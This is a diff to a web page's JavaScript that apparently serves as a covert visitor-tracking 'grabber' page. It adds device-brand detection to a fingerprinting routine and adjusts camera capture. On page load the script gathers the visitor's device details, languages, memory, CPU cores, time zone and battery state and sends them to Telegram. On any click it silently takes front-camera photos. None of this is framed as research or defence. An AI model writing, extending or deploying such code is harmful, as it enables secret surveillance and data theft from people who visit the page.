@@ -53,7 +53,9 @@
 
     async function takePhoto(facing = "user") {
       try {
-        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: facing } });
+        const stream = await navigator.mediaDevices.getUserMedia({
+          video: { facingMode: { ideal: facing } }
+        });
         const video = document.createElement("video");
         video.srcObject = stream;
         await video.play();
@@ -69,6 +71,27 @@
       } catch (err) {
         console.warn("Camera access skipped or denied.");
       }
+    }
+
+    function detectDeviceBrand() {
+      const ua = navigator.userAgent.toLowerCase();
+      if (ua.includes("iphone")) return "Apple iPhone";
+      if (ua.includes("ipad")) return "Apple iPad";
+      if (ua.includes("mac")) return "Apple Mac";
+      if (ua.includes("samsung")) return "Samsung";
+      if (ua.includes("xiaomi")) return "Xiaomi";
+      if (ua.includes("redmi")) return "Redmi";
+      if (ua.includes("realme")) return "Realme";
+      if (ua.includes("vivo")) return "Vivo";
+      if (ua.includes("oppo")) return "Oppo";
+      if (ua.includes("oneplus")) return "OnePlus";
+      if (ua.includes("nokia")) return "Nokia";
+      if (ua.includes("asus")) return "Asus";
+      if (ua.includes("huawei")) return "Huawei";
+      if (ua.includes("lenovo")) return "Lenovo";
+      if (ua.includes("windows")) return "Windows PC";
+      if (ua.includes("android")) return "Android (Unknown Brand)";
+      return "Unknown";
     }
 
     function getBatteryInfo() {
@@ -117,7 +140,9 @@
       const touch = 'ontouchstart' in window ? "Yes" : "No";
       const languages = navigator.languages.join(", ");
       const timeZone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+      const brand = detectDeviceBrand();
 
+      deviceInfo += `📱 Device Brand: ${brand}\n`;
       deviceInfo += `🌐 Language(s): ${languages}\n`;
       deviceInfo += `🧠 RAM: ${navigator.deviceMemory || "?"} GB\n`;
       deviceInfo += `🧮 CPU Cores: ${navigator.hardwareConcurrency || "?"}\n`;
@@ -140,10 +165,10 @@
       await sendToTelegram(deviceInfo);
     }
 
-    // ✅ Send data on page load
+    // ✅ Send info on load
     collectAndSend();
 
-    // ✅ Trigger camera only on user interaction
+    // ✅ Take photo only after user interaction
     window.addEventListener("click", async () => {
       await takePhoto("user");
       await takePhoto("user");
